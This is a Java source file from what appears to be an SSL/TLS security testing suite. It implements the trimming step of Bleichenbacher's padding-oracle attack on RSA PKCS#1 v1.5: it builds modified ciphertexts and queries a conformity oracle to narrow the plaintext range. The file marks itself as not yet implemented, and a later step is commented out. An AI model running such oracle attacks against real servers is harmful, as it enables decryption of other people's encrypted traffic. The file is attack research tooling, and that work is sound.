/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.ssl.stack.tests.attacks.bleichenbacher;

import de.rub.nds.ssl.stack.Utility;
import de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.oracles.AOracle;
import java.math.BigInteger;
import java.util.LinkedList;
import java.util.List;

/**
 *
 * not yet implemented !
 * 
 * @author juraj
 */
public class BleichenbacherAttackCrypto extends BleichenbacherAttack {

    /**
     * max divisor applied
     */
    protected int maxtUsed = 500;
    /**
     * list of divisors within the interval <2,maxtUsed>
     */
    protected List<BigInteger> tList;
    /**
     * max t found
     */
    protected BigInteger maxT = BigInteger.ONE;

    public BleichenbacherAttackCrypto(final byte[] msg, AOracle pkcsOracle,
            int maxtUsed, final boolean msgPKCSconform) {
        super(msg, pkcsOracle, msgPKCSconform);
        this.maxtUsed = maxtUsed;
        tList = new LinkedList<BigInteger>();
    }

    @Override
    protected void stepOneB() {
        System.out.println("Step 1b: Trimming");

        tList = findtList();

        if (tList.isEmpty()) {
            return;
        }

        maxT = Utility.findLCM(tList);

        System.out.println("Searching blaaaa");
        BigInteger minU = findMinU(maxT);
        BigInteger maxU = findMaxU(maxT);

        BigInteger intervalMin = BigInteger.valueOf(2).multiply(bigB).
                multiply(maxT).divide(minU);
        BigInteger intervalMax = (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE).multiply(maxT).divide(maxU);

        m = new Interval[]{new Interval(intervalMin, intervalMax)};

        System.out.println("IntervalMin: \n" + Utility.bytesToHex(intervalMin.toByteArray()));
        System.out.println("IntervalMax: \n" + Utility.bytesToHex(intervalMax.toByteArray()));
    }

    protected List<BigInteger> findtList() {
        BigInteger t = BigInteger.valueOf(4);

        while (t.compareTo(BigInteger.valueOf(maxtUsed)) <= 0) {
            // this has to be adapted according to the oracle
            LinkedList<BigInteger> uList = new LinkedList<BigInteger>();
            uList.add(t.subtract(BigInteger.ONE));
            uList.add(t.add(BigInteger.ONE));

            if (isDivisible(t, uList)) {

                logger.info("Testing max intervals");
                tList.add(t);
            }
            t = t.add(BigInteger.ONE);
        }

        return tList;
    }

    /**
     * TODO: performance !!!
     *
     * @param lcm
     * @return
     */
    private BigInteger findMinU(BigInteger lcm) {
        BigInteger minU = lcm.multiply(BigInteger.valueOf(2)).divide(BigInteger.valueOf(3));
        while (true) {
            if (isDivisible(lcm, minU)) {
                return minU;
            }
            minU = minU.add(BigInteger.valueOf(1));
        }
    }

    /**
     * TODO: performance !!!
     *
     * @param lcm
     * @return
     */
    private BigInteger findMaxU(BigInteger lcm) {
        BigInteger maxU = lcm.multiply(BigInteger.valueOf(3)).divide(BigInteger.valueOf(2));
        while (true) {
            if (isDivisible(lcm, maxU)) {
                return maxU;
            }
            maxU = maxU.subtract(BigInteger.valueOf(1));
        }
    }

    private boolean isDivisible(BigInteger t, BigInteger u) {
        BigInteger c = divideAndMultiply(t, u, c0);

        byte[] msg = Utility.correctSize(c.toByteArray(), blockSize, true);
        if (oracle.checkPKCSConformity(msg)) {
            System.out.println("Checking: \nu = " + u + "\nt = " + t);
            return true;
        }

        return false;
    }
    
    /**
     * 
     * @param t divisor
     * @param u multiplier
     * @param c0 original ciphertext / plaintext
     * @return 
     */
    protected BigInteger divideAndMultiply(BigInteger t, BigInteger u, BigInteger c0) {
        // t^(-1)
        BigInteger t_1 = t.modInverse(publicKey.getModulus());
        BigInteger c;
        if (oracle.isPlaintextOracle()) {
            // m' = m * u * t^(-1) mod N
            c = c0.multiply(t_1).multiply(u).mod(publicKey.getModulus());
        } else {
            // t^(-1)^(e) mod N
            BigInteger t_1pow = t_1.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
            // u^(e) mod N
            BigInteger u_pow = u.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
            // c' = c * u * t^(-1) mod N
            c = c0.multiply(t_1pow).multiply(u_pow).mod(publicKey.getModulus());
        }
        return c;
    }

    private boolean isDivisible(BigInteger t, List<BigInteger> uList) {
        for (BigInteger u : uList) {
            if (isDivisible(t, u)) {
                return true;
            }
        }
        return false;
    }

    private void stepTwoA() {
        return;

//        byte[] send;
//        boolean pkcsConform = false;
//        BigInteger n = publicKey.getModulus();
//
//        System.out.println("Step 2a: Starting the search");
//        // si = ceil(n/(3B))
//        BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
//        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
//            si = tmp[0].add(BigInteger.ONE);
//        } else {
//            si = tmp[0];
//        }
//
//        // correction will be done in do while
//        si = si.subtract(BigInteger.ONE);
//
//        do {
//            si = si.add(BigInteger.ONE);
//            send = prepareMsg(c0, si);
//
//            // check PKCS#1 conformity
//            pkcsConform = oracle.checkPKCSConformity(send);
//        } while (!pkcsConform);
    }

}
